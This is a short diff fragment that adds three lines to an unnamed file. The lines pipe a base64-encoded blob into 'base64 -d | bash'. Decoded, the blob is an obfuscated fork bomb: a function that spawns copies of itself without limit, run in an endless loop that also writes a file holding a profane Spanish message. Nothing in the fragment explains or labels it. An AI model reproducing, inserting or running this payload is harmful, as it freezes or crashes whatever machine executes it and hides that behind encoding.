@@ -1,0 +1,3 @@
+echo 'cHV0YW1pZXJkYSgpeyBwdXRhbWllcmRhfHB1dGFtaWVyZGEmIH07IHdoaWxlIHRydWU7IGRvOyBl
+Y2hvICdKYWphIHB1dGFtaWVyZGEnID4gJ3B1dGEgbWllcmRhJzsgcHV0YW1pZXJkYTsgZWNobyBw
+dXRhbWllcmRhOyBkb25lCg==' | base64 -d | bash
